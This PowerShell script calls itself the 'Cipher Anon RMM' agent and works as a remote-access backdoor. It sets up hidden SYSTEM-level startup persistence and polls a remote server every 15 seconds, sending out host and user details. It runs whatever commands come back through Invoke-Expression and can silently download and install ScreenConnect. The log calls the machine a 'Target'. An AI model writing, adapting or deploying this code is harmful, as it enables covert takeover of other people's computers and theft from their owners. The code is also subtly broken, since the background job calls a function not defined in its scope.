# ============================================================
# CIPHER ANON RMM v3.4 — 15 SECOND POLLING
# ============================================================

# ---- CONFIGURATION ----
$RMM_POLL_INTERVAL = 15000  # 15 seconds

# ============================================================

$BASE_URL = "{{BASE_URL}}"
$RMM_REPORT_URL = "$BASE_URL/api/rmm/report"
$COMMAND_URL = "$BASE_URL/api/rmm/commands"
$RESPONSE_URL = "$BASE_URL/api/rmm/response"
$SCREENCONNECT_URL = "{{SCREENCONNECT_URL}}"

$RMM_CLIENT_DIR = "$env:PROGRAMDATA\CipherAnonRMM"
$RMM_CLIENT_ID_FILE = "$RMM_CLIENT_DIR\client_id.txt"
$RMM_LOGFILE = "$RMM_CLIENT_DIR\rmm_log.txt"

New-Item -ItemType Directory -Path $RMM_CLIENT_DIR -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    Add-Content -Path $RMM_LOGFILE -Value $line
    Write-Host $line
}

Write-Log "============================================"
Write-Log "CIPHER ANON RMM v3.4"
Write-Log "Target: $env:COMPUTERNAME"
Write-Log "Poll Interval: $RMM_POLL_INTERVAL ms (15s)"
Write-Log "============================================"

function Get-RmmClientId {
    if (Test-Path $RMM_CLIENT_ID_FILE) {
        $id = Get-Content $RMM_CLIENT_ID_FILE -Raw
        return $id.Trim()
    }
    $id = [System.Guid]::NewGuid().ToString().Substring(0,8)
    Set-Content -Path $RMM_CLIENT_ID_FILE -Value $id
    return $id
}

function Install-Persistence {
    $taskName = "CipherAnonRMM"
    $scriptPath = $MyInvocation.MyCommand.Path
    
    $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($task) {
        Write-Log "Scheduled task already exists"
        return
    }
    
    Write-Log "Creating scheduled task: $taskName"
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
        Write-Log "Scheduled task created"
    } catch {
        Write-Log "Failed to create scheduled task: $_"
    }
}

function Execute-Command {
    param($Command)
    
    Write-Log "Executing: $Command"
    $result = ""
    $success = $true

    if ($Command -like "install-screenconnect*") {
        Write-Log "Downloading ScreenConnect..."
        $installer = "$env:TEMP\sc_installer.msi"
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($SCREENCONNECT_URL, $installer)
        } catch {
            $result = "Download failed"
            $success = $false
            return @{ success = $success; result = $result }
        }
        if (Test-Path $installer) {
            Write-Log "Installing ScreenConnect..."
            Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden
            Remove-Item $installer -Force -ErrorAction SilentlyContinue
            $result = "ScreenConnect installed"
            try {
                $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                if ($scId) {
                    $result = "ScreenConnect installed - Client ID: " + $scId.ClientID
                }
            } catch {}
        } else {
            $result = "Failed to download ScreenConnect"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "uninstall-rmm") {
        try {
            Unregister-ScheduledTask -TaskName "CipherAnonRMM" -Confirm:$false -ErrorAction SilentlyContinue
            Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
            $result = "RMM uninstalled"
        } catch {
            $result = "Failed to uninstall: $_"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "whoami") {
        $result = $env:USERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "hostname") {
        $result = $env:COMPUTERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "ping") {
        $result = "pong"
        return @{ success = $true; result = $result }
    }

    if ($Command -like "restart") {
        $result = "Restarting system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'" -WindowStyle Hidden
        return @{ success = $true; result = $result }
    }

    if ($Command -like "shutdown") {
        $result = "Shutting down system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'" -WindowStyle Hidden
        return @{ success = $true; result = $result }
    }

    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        $result = $output
        $success = $true
    } catch {
        $result = "Unknown command or error: $_"
        $success = $false
    }

    return @{ success = $success; result = $result }
}

function Start-RmmLoop {
    param(
        $clientId,
        $reportUrl,
        $commandUrl,
        $responseUrl,
        $logFile,
        $pollInterval,
        $scUrl
    )
    
    while ($true) {
        try {
            # Report status
            $reportData = @{
                clientId = $clientId
                pcName = $env:COMPUTERNAME
                username = $env:USERNAME
                os = (Get-WmiObject Win32_OperatingSystem).Caption
                status = "online"
                timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                rmmInstalled = $true
                rmmType = "CipherAnonRMM"
            }
            $reportJson = $reportData | ConvertTo-Json -Depth 5
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
            
            $req = [System.Net.WebRequest]::Create($reportUrl)
            $req.Method = "POST"
            $req.ContentType = "application/json"
            $req.ContentLength = $bytes.Length
            $req.Timeout = 10000
            $stream = $req.GetRequestStream()
            $stream.Write($bytes, 0, $bytes.Length)
            $stream.Close()
            $resp = $req.GetResponse()
            $resp.Close()

            # Check for commands
            $cmdReq = [System.Net.WebRequest]::Create("$commandUrl/$clientId")
            $cmdReq.Method = "GET"
            $cmdReq.Timeout = 10000
            $cmdResp = $cmdReq.GetResponse()
            $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream())
            $cmdJson = $reader.ReadToEnd()
            $cmdResp.Close()

            if ($cmdJson) {
                $cmdData = $cmdJson | ConvertFrom-Json
                if ($cmdData.command) {
                    $cmd = $cmdData.command
                    Write-Log "Command: $cmd"
                    
                    $result = Execute-Command -Command $cmd
                    $responseData = @{
                        clientId = $clientId
                        commandId = $cmdData.id
                        success = $result.success
                        result = $result.result
                        timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                    }
                    $respJson = $responseData | ConvertTo-Json -Depth 5
                    $respBytes = [System.Text.Encoding]::UTF8.GetBytes($respJson)
                    $respReq = [System.Net.WebRequest]::Create("$responseUrl/$clientId")
                    $respReq.Method = "POST"
                    $respReq.ContentType = "application/json"
                    $respReq.ContentLength = $respBytes.Length
                    $respReq.Timeout = 10000
                    $respStream = $respReq.GetRequestStream()
                    $respStream.Write($respBytes, 0, $respBytes.Length)
                    $respStream.Close()
                    $respResp = $respReq.GetResponse()
                    $respResp.Close()
                }
            }
        } catch {
            Write-Log "Loop error: $_"
        }
        Start-Sleep -Milliseconds $pollInterval
    }
}

# ---- MAIN ----
$clientId = Get-RmmClientId
Write-Log "Client ID: $clientId"

Install-Persistence

# Start the main loop in a background job
$job = Start-Job -ScriptBlock ${function:Start-RmmLoop} -ArgumentList $clientId, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL

if ($job) {
    Write-Log "RMM agent started as background job"
    Write-Log ""
    Write-Log "============================================"
    Write-Log "RMM CLIENT READY!"
    Write-Log "Client ID: $clientId"
    Write-Log "Poll Interval: $RMM_POLL_INTERVAL ms (15s)"
    Write-Log "Log saved to: $RMM_LOGFILE"
    Write-Log "============================================"
} else {
    Write-Log "FAILED TO START RMM AGENT!"
}

exit
